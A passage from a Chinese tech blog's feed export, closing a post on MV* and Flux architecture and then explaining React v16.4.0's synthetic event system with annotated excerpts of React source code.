是一种架构思想，专门解决软件的结构问题。它跟MVC架构是同一类东西，但是更加简单和清晰。</p><p>flux的核心思想和代码实现虽然很简单（基本上就是一个event dispatcher而已），但在“state-view”开发模式中，却是非常重要的一个环节。</p><blockquote><p>Flux存在多种实现（至少15种）</p></blockquote><p>图示：</p><p><img src="/imgs/MV-模式/flux.png" alt></p><h5 id="基本概念（组成部分）："><a href="#基本概念（组成部分）：" class="headerlink" title="基本概念（组成部分）："></a>基本概念（组成部分）：</h5><ul><li>View：视图层  </li><li>Action（动作）：视图层发出的消息（比如mouseClick）  </li><li>Dispatcher（派发器）：用来接收Actions、执行回调函数  </li><li>Store（数据层）：用来存放应用的状态，一旦发生变动，就提醒Views要更新页面  </li></ul><p>Flux 的最大特点，就是数据的”单向流动”：   </p><ul><li>用户访问 View  </li><li>View 发出用户的 Action  </li><li>Dispatcher 收到 Action，要求 Store 进行相应的更新  </li><li>Store 更新后，发出一个”change”事件  </li><li>View 收到”change”事件后，更新页面 </li></ul><p>上面过程中，数据总是”单向流动”，任何相邻的部分都不会发生数据的”双向流动”。这保证了流程的清晰。</p><p><img src="/imgs/MV-模式/flux-abstract.png" alt></p><p>对比MVC  </p><p><img src="/imgs/MV-模式/MVC_bad.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>MV* 的目的是把应用程序的数据、业务逻辑和界面展示部分这三块解耦，分离关注点，不仅利于团队协作和测试，更有利于维护和管理。业务逻辑不再关心底层数据的读写，而这些数据又以对象的形式呈现给业务逻辑层。从MVC-&gt;MVP-&gt;MVVM，就像一个打怪升级的过程。后者解决了前者遗留的问题，把前者的缺点优化成了优点。它们都是在MVC的基础上随着时代和应用环境的发展衍变而来的。</p><p><a href="https://github.com/livoras/blog/issues/11" target="_blank" rel="noopener">界面之下的：还原真实的MV*模式</a></p><p><a href="https://www.cnblogs.com/fliu/articles/5245923.html" target="_blank" rel="noopener">Flux架构入门</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MV-模式&quot;&gt;&lt;a href=&quot;#MV-模式&quot; class=&quot;headerlink&quot; title=&quot;MV* 模式&quot;&gt;&lt;/a&gt;MV* 模式&lt;/h1&gt;&lt;h4 id=&quot;三个非常重要的架构模式：&quot;&gt;&lt;a href=&quot;#三个非常重要的架构模式：&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>React v16.4.0 事件原理</title>
    <link href="http://swingboy.github.io/2018/07/26/React-v16-4-0-%E4%BA%8B%E4%BB%B6%E5%8E%9F%E7%90%86/"/>
    <id>http://swingboy.github.io/2018/07/26/React-v16-4-0-事件原理/</id>
    <published>2018-07-26T10:54:20.000Z</published>
    <updated>2019-11-23T14:30:40.343Z</updated>
    
    <content type="html"><![CDATA[<p>（针对v16.4.0）</p><h3 id="原生事件系统"><a href="#原生事件系统" class="headerlink" title="原生事件系统"></a>原生事件系统</h3><p>我们通常监听真实DOM。举🌰来说，我们想监听按钮的点击事件，那么我们在按钮DOM上绑定事件和对应的回调函数即可。</p><blockquote><p>遗憾的是若页面复杂且事件处理频率高，那么对网页性能是个考验。</p></blockquote><h3 id="React事件系统"><a href="#React事件系统" class="headerlink" title="React事件系统"></a>React事件系统</h3><p>react的事件处理再眼花缭乱终究还是要回归原生的事件系统。</p><h3 id="react事件绑定"><a href="#react事件绑定" class="headerlink" title="react事件绑定"></a>react事件绑定</h3><p>react 中的事件是根据 nativeEvent 对象修改后的合成对象，对于事件采用事件委托，将事件绑定在顶层 document 对象上。对于全局 dom 元素中所涉及的事件， react 都会处理。对于冒泡事件，是在 document 对象的冒泡阶段触发。对于非冒泡事件，是在 document 对象的捕获阶段触发。最后在 dispatchEvent 中决定真正回调函数的执行。</p><h3 id="合成事件"><a href="#合成事件" class="headerlink" title="合成事件"></a>合成事件</h3><p>事件处理程序通过 合成事件（SyntheticEvent）的实例传递，SyntheticEvent 是浏览器原生事件跨浏览器的封装。SyntheticEvent 和浏览器原生事件一样有 stopPropagation()、preventDefault() 接口，而且这些接口夸浏览器兼容。</p><p>如果出于某些原因想使用浏览器原生事件，可以使用 nativeEvent 属性获取。每个和成事件（SyntheticEvent）对象都有以下属性：</p><p>boolean bubbles<br>boolean cancelable<br>DOMEventTarget currentTarget<br>boolean defaultPrevented<br>Number eventPhase<br>boolean isTrusted<br>DOMEvent nativeEvent<br>void preventDefault()<br>void stopPropagation()<br>DOMEventTarget target<br>Date timeStamp<br>String type</p><p>React实现了SyntheticEvent层处理事件</p><p>详细来说，React并不像原生事件一样将事件和DOM一一对应，而是将所有的事件都绑定在网页的document，通过统一的事件监听器处理并分发，找到对应的回调函数并执行。按照官方文档的说法，事件处理程序将传递SyntheticEvent的实例。</p><h3 id="react提出统一事件处理的目的主要是："><a href="#react提出统一事件处理的目的主要是：" class="headerlink" title="react提出统一事件处理的目的主要是："></a>react提出统一事件处理的目的主要是：</h3><p>1.浏览器兼容性<br>2.改善性能<br>在复杂的UI系统中，越多的事件处理意味着应用需要消耗的内存越多。手动解决这个问题并不是很麻烦，但是在冗长的过程中，你需要尝试去给在来源于同一个父节点的事件进行分组。很难权衡。而React就帮我们解决了这个问题。<br>React不是直接的将事件挂在dom上，它在document的根部用一个事件处理去监听和调用相应的事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Overview of React and the event system:</span><br><span class="line"> *</span><br><span class="line"> * +------------+    .</span><br><span class="line"> * |    DOM     |    .</span><br><span class="line"> * +------------+    .</span><br><span class="line"> *       |           .</span><br><span class="line"> *       v           .</span><br><span class="line"> * +------------+    .</span><br><span class="line"> * | ReactEvent |    .</span><br><span class="line"> * |  Listener  |    .</span><br><span class="line"> * +------------+    .                         +-----------+</span><br><span class="line"> *       |           .               +--------+|SimpleEvent|</span><br><span class="line"> *       |           .               |         |Plugin     |</span><br><span class="line"> * +-----|------+    .               v         +-----------+</span><br><span class="line"> * |     |      |    .    +--------------+                    +------------+</span><br><span class="line"> * |     +-----------.---&gt;|EventPluginHub|                    |    Event   |</span><br><span class="line"> * |            |    .    |              |     +-----------+  | Propagators|</span><br><span class="line"> * | ReactEvent |    .    |              |     |TapEvent   |  |------------|</span><br><span class="line"> * |  Emitter   |    .    |              |&lt;---+|Plugin     |  |other plugin|</span><br><span class="line"> * |            |    .    |              |     +-----------+  |  utilities |</span><br><span class="line"> * |     +-----------.---&gt;|              |                    +------------+</span><br><span class="line"> * |     |      |    .    +--------------+</span><br><span class="line"> * +-----|------+    .                ^        +-----------+</span><br><span class="line"> *       |           .                |        |Enter/Leave|</span><br><span class="line"> *       +           .                +-------+|Plugin     |</span><br><span class="line"> * +-------------+   .                         +-----------+</span><br><span class="line"> * | application |   .</span><br><span class="line"> * |-------------|   .</span><br><span class="line"> * |             |   .</span><br><span class="line"> * |             |   .</span><br><span class="line"> * +-------------+   .</span><br><span class="line"> *                   .</span><br><span class="line"> *    React Core     .  General Purpose Event Plugin System</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h4 id="SyntheticEvent"><a href="#SyntheticEvent" class="headerlink" title="SyntheticEvent"></a>SyntheticEvent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * @param &#123;object&#125; dispatchConfig Configuration used to dispatch this event.</span><br><span class="line"> * @param &#123;*&#125; targetInst Marker identifying the event target.</span><br><span class="line"> * @param &#123;object&#125; nativeEvent Native browser event.</span><br><span class="line"> * @param &#123;DOMEventTarget&#125; nativeEventTarget Target node.</span><br><span class="line">* /</span><br><span class="line">function SyntheticEvent(dispatchConfig, targetInst, nativeEvent, nativeEventTarget) &#123;</span><br><span class="line"></span><br><span class="line">  this.dispatchConfig = dispatchConfig;</span><br><span class="line">  this._targetInst = targetInst;</span><br><span class="line">  this.nativeEvent = nativeEvent;</span><br><span class="line"></span><br><span class="line">  var Interface = this.constructor.Interface;</span><br><span class="line">  for (var propName in Interface) &#123;</span><br><span class="line">    if (!Interface.hasOwnProperty(propName)) &#123;</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    var normalize = Interface[propName];</span><br><span class="line">    if (normalize) &#123;</span><br><span class="line">      this[propName] = normalize(nativeEvent);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      if (propName === &apos;target&apos;) &#123;</span><br><span class="line">        this.target = nativeEventTarget;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this[propName] = nativeEvent[propName];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var defaultPrevented = nativeEvent.defaultPrevented != null ? nativeEvent.defaultPrevented : nativeEvent.returnValue === false;</span><br><span class="line">  if (defaultPrevented) &#123;</span><br><span class="line">    this.isDefaultPrevented = emptyFunction.thatReturnsTrue;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    this.isDefaultPrevented = emptyFunction.thatReturnsFalse;</span><br><span class="line">  &#125;</span><br><span class="line">  this.isPropagationStopped = emptyFunction.thatReturnsFalse;</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_assign(SyntheticEvent.prototype, &#123;</span><br><span class="line">  preventDefault: function () &#123;</span><br><span class="line">    this.defaultPrevented = true;</span><br><span class="line">    var event = this.nativeEvent;</span><br><span class="line">    if (!event) &#123;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (event.preventDefault) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; else if (typeof event.returnValue !== &apos;unknown&apos;) &#123;</span><br><span class="line">      event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    this.isDefaultPrevented = emptyFunction.thatReturnsTrue;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  stopPropagation: function () &#123;</span><br><span class="line">    var event = this.nativeEvent;</span><br><span class="line">    if (!event) &#123;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (event.stopPropagation) &#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; else if (typeof event.cancelBubble !== &apos;unknown&apos;) &#123;</span><br><span class="line">      event.cancelBubble = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.isPropagationStopped = emptyFunction.thatReturnsTrue;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  destructor: function () &#123;</span><br><span class="line">    var Interface = this.constructor.Interface;</span><br><span class="line">    for (var propName in Interface) &#123;</span><br><span class="line">      &#123;</span><br><span class="line">        Object.defineProperty(this, propName, getPooledWarningPropertyDefinition(propName, Interface[propName]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (var i = 0; i &lt; shouldBeReleasedProperties.length; i++) &#123;</span><br><span class="line">      this[shouldBeReleasedProperties[i]] = null;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">SyntheticEvent.Interface = EventInterface;</span><br><span class="line"></span><br><span class="line">新建事件对象时，会重写stopPropagation（阻止冒泡） 和 preventDefault（阻止默认行为）这样的原生事件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//我们所熟知事件接口 ，nativeEvent对象属性</span><br><span class="line">var EventInterface = &#123;</span><br><span class="line">  type: null,</span><br><span class="line">  target: null,</span><br><span class="line">  currentTarget: emptyFunction.thatReturnsNull,</span><br><span class="line">  eventPhase: null,</span><br><span class="line">  bubbles: null,</span><br><span class="line">  cancelable: null,</span><br><span class="line">  timeStamp: function (event) &#123;</span><br><span class="line">    return event.timeStamp || Date.now();</span><br><span class="line">  &#125;,</span><br><span class="line">  defaultPrevented: null,</span><br><span class="line">  isTrusted: null</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有下面的这些合成对象，这些对于事件类别不同，而有不同的属性<br>MouseEvent,AnimationEvent, UIEvent, InputEvent, CompositionEvent, ClipboardEvent, FocusEvent, KeyboardEvent, DragEvent, TouchEvent, TransitionEvent, WheelEvent上述的EventInterface基础上再添加</p><h3 id="简单看下过程"><a href="#简单看下过程" class="headerlink" title="简单看下过程"></a>简单看下过程</h3><p><img src=".绑定/imgs/.png" alt></p><p><img src="./imgs/触发.png" alt></p><h4 id="事件注册"><a href="#事件注册" class="headerlink" title="事件注册"></a>事件注册</h4><p>事件的绑定在completeWork阶段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">function completeWork(current, workInProgress, renderExpirationTime) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    var _instance = createInstance(type, newProps, rootContainerInstance, _currentHostContext, workInProgress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //接着</span><br><span class="line">    if (finalizeInitialChildren(_instance, type, newProps, rootContainerInstance, _currentHostContext)) &#123;</span><br><span class="line">              markUpdate(workInProgress);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    //.....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function createInstance(type, props, rootContainerInstance, hostContext, internalInstanceHandle) &#123;</span><br><span class="line">  var parentNamespace = void 0;</span><br><span class="line">  &#123;</span><br><span class="line">    var hostContextDev = hostContext;</span><br><span class="line">    validateDOMNesting$1(type, null, hostContextDev.ancestorInfo);</span><br><span class="line">    if (typeof props.children === &apos;string&apos; || typeof props.children === &apos;number&apos;) &#123;</span><br><span class="line">      var string = &apos;&apos; + props.children;</span><br><span class="line">      var ownAncestorInfo = updatedAncestorInfo(hostContextDev.ancestorInfo, type, null);</span><br><span class="line">      validateDOMNesting$1(null, string, ownAncestorInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    parentNamespace = hostContextDev.namespace;</span><br><span class="line">  &#125;</span><br><span class="line">  debugger;</span><br><span class="line">  var domElement = createElement(type, props, rootContainerInstance, parentNamespace);</span><br><span class="line">  precacheFiberNode$1(internalInstanceHandle, domElement);</span><br><span class="line">  updateFiberProps$1(domElement, props);</span><br><span class="line">  return domElement;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">domElement等于真实创建的dom，里面调用的就是我们熟悉的createElement。而precacheFiberNode和updateFiberProps两个方法分别给domElement(真实dom)添加了两个属性。所有react16项目中的dom都会拥有这两个属性，并且这个两个属性的属性名在同一个项目中是一致的。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//修改属性</span><br><span class="line">function getFiberCurrentPropsFromNode$1(node) &#123;</span><br><span class="line">  return node[internalEventHandlersKey] || null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//sck 更新属性 </span><br><span class="line">//这里的props就是 所绑定元素的属性props</span><br><span class="line">function updateFiberProps(node, props) &#123;</span><br><span class="line">  // debugger;</span><br><span class="line">  node[internalEventHandlersKey] = props;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后呢，就是监听document或者fragment上的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function ensureListeningTo(rootContainerElement, registrationName) &#123;</span><br><span class="line">  var isDocumentOrFragment = rootContainerElement.nodeType === DOCUMENT_NODE || rootContainerElement.nodeType === DOCUMENT_FRAGMENT_NODE;</span><br><span class="line">  //就是document</span><br><span class="line">  var doc = isDocumentOrFragment ? rootContainerElement : rootContainerElement.ownerDocument;</span><br><span class="line">  listenTo(registrationName, doc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ensureListeningTo里调用listenTo方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">function listenTo(registrationName, mountAt) &#123;</span><br><span class="line">  debugger;</span><br><span class="line">  var isListening = getListeningForDocument(mountAt);</span><br><span class="line">  var dependencies = registrationNameDependencies[registrationName];</span><br><span class="line"></span><br><span class="line">  for (var i = 0; i &lt; dependencies.length; i++) &#123;</span><br><span class="line">    var dependency = dependencies[i];</span><br><span class="line">    if (!(isListening.hasOwnProperty(dependency) &amp;&amp; isListening[dependency])) &#123;</span><br><span class="line">      switch (dependency) &#123;</span><br><span class="line">        case TOP_SCROLL:</span><br><span class="line">          trapCapturedEvent(TOP_SCROLL, mountAt);</span><br><span class="line">          break;</span><br><span class="line">        case TOP_FOCUS:</span><br><span class="line">        case TOP_BLUR:</span><br><span class="line">          trapCapturedEvent(TOP_FOCUS, mountAt);</span><br><span class="line">          trapCapturedEvent(TOP_BLUR, mountAt);</span><br><span class="line">          // We set the flag for a single dependency later in this function,</span><br><span class="line">          // but this ensures we mark both as attached rather than just one.</span><br><span class="line">          isListening[TOP_BLUR] = true;</span><br><span class="line">          isListening[TOP_FOCUS] = true;</span><br><span class="line">          break;</span><br><span class="line">        case TOP_CANCEL:</span><br><span class="line">        case TOP_CLOSE:</span><br><span class="line">          if (isEventSupported(getRawEventName(dependency), true)) &#123;</span><br><span class="line">            trapCapturedEvent(dependency, mountAt);</span><br><span class="line">          &#125;</span><br><span class="line">          break;</span><br><span class="line">        case TOP_INVALID:</span><br><span class="line">        case TOP_SUBMIT:</span><br><span class="line">        case TOP_RESET:</span><br><span class="line">          break;</span><br><span class="line">        default:</span><br><span class="line">          var isMediaEvent = mediaEventTypes.indexOf(dependency) !== -1;</span><br><span class="line">          if (!isMediaEvent) &#123;</span><br><span class="line">            trapBubbledEvent(dependency, mountAt);</span><br><span class="line">          &#125;</span><br><span class="line">          break;</span><br><span class="line">      &#125;</span><br><span class="line">      isListening[dependency] = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在listenTo中调trapBubbledEvent。 其实埋点的监听的过程。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function trapBubbledEvent(topLevelType, element) &#123;</span><br><span class="line">  if (!element) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  var dispatch = isInteractiveTopLevelEventType(topLevelType) ? dispatchInteractiveEvent : dispatchEvent;</span><br><span class="line"></span><br><span class="line">  // 此时的listenner还是原来的</span><br><span class="line">  addEventBubbleListener(element, getRawEventName(topLevelType),</span><br><span class="line">  // Check if interactive and wrap in interactiveUpdates</span><br><span class="line">  dispatch.bind(null, topLevelType));</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addEventBubbleListener(element, eventType, listener) &#123;</span><br><span class="line">  debugger;</span><br><span class="line">  element.addEventListener(eventType, listener, false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：completeWork-&gt;createInstance(更新属性等等)-&gt;setInitialDOMProperties-&gt;ensureListeningTo<br>-&gt;listenTo-&gt;trapBubbledEvent-&gt;addEventBubbleListener（进行我们熟悉的addEventListener）-&gt; commitAllHostEffects 最后渲染完成</p><h4 id="二-事件合成"><a href="#二-事件合成" class="headerlink" title="二 事件合成"></a>二 事件合成</h4><p>有点重合，逻辑有点重合。其实是前后脚的关系。</p><p>事件合成的过程，首先根据触发事件的target得到inst，然后遍历他的所有父节点,存储在局部遍历path中，记住这个path是有顺序关系的（后面可以解释react事件是如何阻止冒泡的）。得到path后进行遍历，假设遍历的组件同样注册了对应事件的listener，那么就挂载到event的_dispatchListeners和_dispatchInstances中去,这两个属性至关重要，后续的事件派发就是根据这两个属性进行的。 注意只有注册了对应事件的listener，才会挂载到event里面去。比如刚刚我们的ABC都绑定了Click，自然都会push到_dispatchListeners中去。</p><h4 id="三-事件派发"><a href="#三-事件派发" class="headerlink" title="三 事件派发"></a>三 事件派发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//callback is this func 注册事件的时候是listen的这个方法 </span><br><span class="line">function dispatchInteractiveEvent(topLevelType, nativeEvent) &#123;</span><br><span class="line">  interactiveUpdates(dispatchEvent, topLevelType, nativeEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function runExtractedEventsInBatch(topLevelType, targetInst, nativeEvent, nativeEventTarget) &#123;</span><br><span class="line">  debugger;</span><br><span class="line">  //获得所有绑定的事件 看下面代码</span><br><span class="line">  var events = extractEvents(topLevelType, targetInst, nativeEvent, nativeEventTarget);</span><br><span class="line">  runEventsInBatch(events, false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function runEventsInBatch(events, simulated) &#123;</span><br><span class="line">  //(&apos;runEventsInBatch&apos;);</span><br><span class="line">  if (events !== null) &#123;</span><br><span class="line">    eventQueue = accumulateInto(eventQueue, events);</span><br><span class="line">  &#125;</span><br><span class="line">  .....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function extractEvents(topLevelType, targetInst, nativeEvent, nativeEventTarget) &#123;</span><br><span class="line">  var events = null;</span><br><span class="line">  for (var i = 0; i &lt; plugins.length; i++) &#123;</span><br><span class="line">    // Not every plugin in the ordering may be loaded at runtime.</span><br><span class="line">    var possiblePlugin = plugins[i];</span><br><span class="line">    if (possiblePlugin) &#123;</span><br><span class="line">      var extractedEvents = possiblePlugin.extractEvents(topLevelType, targetInst, nativeEvent, nativeEventTarget);</span><br><span class="line">      if (extractedEvents) &#123;</span><br><span class="line">        events = accumulateInto(events, extractedEvents);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  //此时的 event 含有_dispatchListeners 属性。。一个数组，里面有绑定的回调函数</span><br><span class="line">  return events;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在 runEventsInBatch这里面先得到 eventQueue，也就是 target 为合成事件对象的 proxy 对象。然后对数组元素挨个进行 executeDispatchesInOrder，也就是对合成事件对象的 _dispatchListeners 按序执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">紧接着~~~~~ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//接下来就是这一段了</span><br><span class="line">// Create a fake event type.</span><br><span class="line">var evtType = &apos;react-&apos; + (name ? name : &apos;invokeguardedcallback&apos;);</span><br><span class="line"></span><br><span class="line">// Attach our event handlers</span><br><span class="line">window.addEventListener(&apos;error&apos;, onError);</span><br><span class="line">//sck 事件创建于触发</span><br><span class="line">console.log(&apos;sck--&apos;, evtType);</span><br><span class="line">//为甚好多次？ </span><br><span class="line">// sck-- react-invokeguardedcallback</span><br><span class="line">debugger</span><br><span class="line">fakeNode.addEventListener(evtType, callCallback, false);</span><br><span class="line"></span><br><span class="line">// Synchronously dispatch our fake event. If the user-provided function</span><br><span class="line">// errors, it will trigger our global error handler.</span><br><span 